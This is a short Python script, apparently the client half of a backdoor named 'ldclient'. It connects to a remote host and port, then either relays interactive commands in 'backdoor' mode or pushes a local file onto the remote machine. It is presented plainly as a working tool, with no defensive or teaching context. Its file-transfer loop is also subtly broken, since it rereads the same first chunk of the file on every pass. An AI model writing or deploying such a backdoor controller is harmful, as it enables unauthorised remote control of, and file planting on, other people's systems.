import socket
import sys

s = socket.socket()
port = 0
host = '127.0.0.1'
conntype = "backdoor"
filetotransfer = ""
newfilename = ""

for i in range(len(sys.argv)):
    if sys.argv[i] == '-a':
        i+=1
        host = sys.argv[i]
    if sys.argv[i] == '-p':
        i+=1
        port = int(sys.argv[i])
    if sys.argv[i] == '-tf':
        i+=1
        conntype = "filetransfer"
        if i < len(sys.argv):
            filetotransfer = sys.argv[i]
        else:
            print("ldclient: -tf (transfer-file): Need File!")
            filetotransfer = input("Filename: ")
        i+=1
        if i < len(sys.argv):
            newfilename = sys.argv[i]
        else:
            print("ldclient: -tf (transfer-file): Need New File Name!")
            newfilename = input("Filename: ")
            
if port == 0:
    print("Needs Port!")
    port = int(input("Port: "))

s.connect((host, port))
print(s.recv(2048).decode('utf-8'))
s.send(conntype.encode('utf-8'))
print("You are in " + conntype + " mode") 
if conntype == 'backdoor':
    while True:
        msg = input()
        s.send(msg.encode('utf-8'))
        print(s.recv(8192).decode('utf-8'))
        if msg == "exit":
            print("ldclient: exiting!")
            break;
elif conntype == 'filetransfer':
    s.send(newfilename.encode('utf-8'))
    while True:
        print(s.recv(2048).decode('utf-8'))
        with open(filetotransfer) as file:
            fstr = file.read(2048)
            s.send(fstr.encode('utf-8'))
            recieved = s.recv(2048).decode('utf-8')
            if len(fstr) < 2048:
                break
    print("ldclient: exiting!")
    s.send("exit".encode('utf-8'))
        
s.close()
